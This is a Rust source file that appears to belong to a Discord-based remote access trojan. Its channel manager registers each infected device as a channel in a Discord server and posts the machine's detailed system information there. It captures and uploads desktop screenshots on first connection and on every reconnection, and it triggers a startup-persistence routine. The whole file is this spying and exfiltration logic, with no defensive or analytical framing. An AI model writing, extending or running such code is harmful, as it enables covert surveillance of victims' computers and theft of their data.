use crate::core::device_id::DeviceId;
use crate::core::screenshot::Screenshot;
use crate::system_info::{DeviceInfo, SystemInfo};
use crate::log_debug;
use crate::prelude::*;
use crate::prelude::serenity;
use anyhow::Result;
use std::sync::Arc;

pub struct ChannelManager {
    http: Arc<serenity::Http>,
    guild_id: GuildId,
}

impl ChannelManager {
    pub fn new(http: Arc<serenity::Http>, guild_id: GuildId) -> Self {
        Self { http, guild_id }
    }

    pub async fn init_dchannel(&self) -> Result<ChannelId> {
        let device_name = DeviceId::get_device_channel_name()?;
        log_debug!("Looking for device channel: {}", device_name);

        if let Some(channel_id) = self.find_cbn(&device_name).await? {
            log_debug!(
                "Found existing channel: {} (ID: {})",
                device_name, channel_id
            );
            self.announce_device(channel_id).await?;
            return Ok(channel_id);
        }

        log_debug!("Channel not found, creating new channel: {}", device_name);
        let channel_id = self.create_dchannel(&device_name).await?;

        self.announce_dconnect(channel_id).await?;

        Ok(channel_id)
    }

    async fn find_cbn(&self, channel_name: &str) -> Result<Option<ChannelId>> {
        let channels = self.http.get_channels(self.guild_id).await?;

        for channel in channels {
            if channel.name.as_str() == channel_name && channel.kind == serenity::model::channel::ChannelType::Text {
                return Ok(Some(channel.id));
            }
        }

        Ok(None)
    }

    async fn create_dchannel(&self, channel_name: &str) -> Result<ChannelId> {
        let channel = self.guild_id.create_channel(&self.http, 
            serenity::builder::CreateChannel::new(channel_name)
                .kind(serenity::model::channel::ChannelType::Text)
        ).await?;

        log_debug!("Created new channel: {} (ID: {})", channel_name, channel.id);
        Ok(channel.id)
    }

    async fn announce_device(&self, channel_id: ChannelId) -> Result<()> {
        let system_info = SystemInfo::get_detailed_info()?;
        let device_profile = DeviceInfo::new()?;
        let message = system_info.format_reconnection(&device_profile);

        channel_id.say(&self.http, &message).await?;

        if let Err(e) = crate::core::startup::check_startup().await {
            log_debug!("Failed to ensure startup persistence: {}", e);
        }

        match Screenshot::capture_as_bytes() {
            Ok((screenshot_data, filename)) => {
                log_debug!(
                    "Captured reconnection screenshot: {} ({} bytes)",
                    filename,
                    screenshot_data.len()
                );

                let attachment = serenity::CreateAttachment::bytes(screenshot_data, filename);
                
                channel_id.send_message(&self.http, 
                    serenity::CreateMessage::new()
                        .content("**Current Desktop Screenshot**")
                        .add_file(attachment)
                ).await?;

                log_debug!("Reconnection screenshot sent successfully");
            }
            Err(e) => {
                log_debug!("Failed to capture reconnection screenshot: {}", e);
                channel_id.say(&self.http, format!("Screenshot capture failed: {}", e)).await?;
            }
        }

        Ok(())
    }

    async fn announce_dconnect(&self, channel_id: ChannelId) -> Result<()> {
        let system_info = SystemInfo::get_detailed_info()?;
        let device_profile = DeviceInfo::new()?;
        let message = system_info.format_for_discord(&device_profile);

        channel_id.say(&self.http, &message).await?;

        match Screenshot::capture_as_bytes() {
            Ok((screenshot_data, filename)) => {
                log_debug!(
                    "Captured screenshot: {} ({} bytes)",
                    filename,
                    screenshot_data.len()
                );

                let attachment = serenity::CreateAttachment::bytes(screenshot_data, filename);
                
                channel_id.send_message(&self.http,
                    serenity::CreateMessage::new()
                        .content("**Desktop Screenshot**")
                        .add_file(attachment)
                ).await?;
                
                log_debug!("Screenshot sent successfully");
            }
            Err(e) => {
                log_debug!("Failed to capture screenshot: {}", e);
                channel_id.say(&self.http, format!("Screenshot capture failed: {}", e)).await?;
            }
        }

        Ok(())
    }
}
